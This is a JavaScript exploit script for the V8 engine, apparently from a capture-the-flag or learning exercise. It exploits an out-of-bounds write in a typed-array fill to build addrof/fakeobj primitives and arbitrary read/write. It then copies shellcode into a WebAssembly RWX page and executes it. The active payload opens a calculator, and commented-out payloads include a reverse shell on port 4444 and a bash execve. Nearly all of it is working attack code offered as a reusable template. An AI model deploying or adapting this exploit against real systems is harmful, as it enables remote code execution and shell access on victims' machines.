/// Helper functions 
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function ftoh(val){

    return "0x" + ftoi(val).toString(16);
}

function dp(x){ %DebugPrint(x);}

function gc() {
  for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }
}

function break_point(){
    Math.cosh(1);
}


// ----------------------- EXPLOIT GOES FROM HERE

var oob = new Uint32Array(5);
var fl_arr = [1.1, 2.2, 3.3];

oob.fill(0x20, 33, 38);  // 33 and 38 is imp and found by trail/error

var fl_map = fl_arr[3];
var fl_element_ptr = fl_arr[4];

console.log("[+] Leaked map ptr: ", ftoh(fl_map));
console.log("[+] Leaked element ptr: ", ftoh(fl_element_ptr));

var obj_arr = [{"a":1}, {"b":2}, {"c": 3}];

// you can find the obj_arr element ptr using f_arr element leaked ptr (subtract dp(obj_arr)-dp(a_arr))
var obj_arr_map = itof(ftoi(fl_arr[3]) + 0x50n);  // this is fixed almost everytime
console.log("[+] Obj_arr map leaked: ", ftoh(obj_arr_map));

var obj_element_ptr = itof(ftoi(fl_arr[4]) + 0x158n);   // variable, check using dp
console.log("[+] Obj_arr element ptr: ", ftoh(obj_element_ptr));

// Super easy to leak addr of an obj, Just store the fake obj at index 0 in obj_arr and as we changed our arr element's ptr to obj_arr's, so now 
// we can get the fake obj as arr[0] bcoz now a_arr elements ptr = obj_arr element's ptr

function addrof(leak_obj) {

    // Always create a new array here, dont use previous ones
    var arr = fl_arr;

    //Swapping our array element's ptr to obj_arr elements's ptr
    //arr[4] = obj_element_ptr;
    arr[4] = itof((ftoi(arr[4]) & 0xffffffff00000000n) + ftoi(obj_element_ptr));
    //console.log("[+] Elements ptr swapped from %s to %x: ",ftoh(fl_arr[4]), ftoh(arr[4]));
    obj_arr[0] = leak_obj; //store leak_obj at 0th index in obj_arr because of type confusion

    return ftoi(arr[0]);
}


// We just store addr in arr (float type array) and change its map to obj_map but v8 still thinks it is a float array and thus creates a type confusion
function fakeobj(addr) { //type addr: BigInt

    var arrr = fl_arr;

    arrr[0] = itof(addr);  // store addr at 0 index
    //arrr[3] = obj_arr_map; //change float map to obj map
    arrr[3] = itof((ftoi(arrr[3]) & 0xffffffff00000000n) + ftoi(obj_arr_map));
    let fake = arrr[0];  // fetch fakeobj as arr[0] because of type confusion

    return fake;
}

// ----------- Most of the stuff is generic from here, can be used as template just change the shellcode and crosscheck backing store offset if needed

var fake_arr = [fl_arr[3], 1.1, 1.2, 1.3]
var fake = fakeobj(addrof(fake_arr) - 0x20n)  //subtracting 0x20 to reach 0th index in fake_arr and convert that to a fake_obj

function read(addr){ //type addr: Int

    if (addr%2n==0){  //ensure it is pointer tagged
        addr += 1n;
    }
    fake_arr[1] = itof((8n << 32n) + BigInt(addr) -8n); //store the addr on 1st index of fake_arr
    return fake[0];
}


function write(addr, val){
    if (addr % 2n == 0){
        addr += 1n;
    }
    fake_arr[1] = itof((8n << 32n) + BigInt(addr) -8n); //-8n bcoz it r/w at addr+0x10n/0x8n by default
    fake[0] = itof(BigInt(val));
}

// Create a RWX page using web assembly
// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

console.log("[+] Addr of web assembly instance: 0x" + addrof(wasm_instance).toString(16));

var rwx_page_addr = read(addrof(wasm_instance) + 0x68n);  //0x68n is the distance of rwx_page from base

console.log("[+] Addr of RWX page: ", ftoh(rwx_page_addr));

//Shellcode goes here

function copy_shellcode(addr, shellcode) {
    // ArrayBuffer and Dataview allows us to write data to the addr in binary format
    let buf = new ArrayBuffer(0x100);  
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0xcn; //cross check this using DebugPrint on buf to see where backing store is (x/16xw $buf)
    write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
    }
}


//Reverse shellcode on port 4444
//var shellcode = [72, 49, 192, 72, 131, 192, 41, 72, 49, 255, 72, 137, 250, 72, 131, 199, 2, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 137, 199, 72, 49, 192, 80, 72, 131, 192, 2, 199, 68, 36, 252, 10, 10, 14, 14, 102, 199, 68, 36, 250, 17, 92, 102, 137, 68, 36, 248, 72, 131, 236, 8, 72, 131, 192, 40, 72, 137, 230, 72, 49, 210, 72, 131, 194, 16, 15, 5, 72, 49, 192, 72, 137, 198, 72, 131, 192, 33, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 2, 15, 5, 72, 49, 192, 80, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 83, 72, 137, 231, 80, 72, 137, 226, 87, 72, 137, 230, 72, 131, 192, 59, 15, 5];

//Shellcode for popping calc8
var shellcode = [
    0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
    0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
    0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,
    0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
    0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,
    0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,
    0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
    0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
  ];


//shellcode of execve
//var shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05]


console.log("Executing shellcode, Popping calc!");
copy_shellcode(ftoi(rwx_page_addr), shellcode);
pwn();

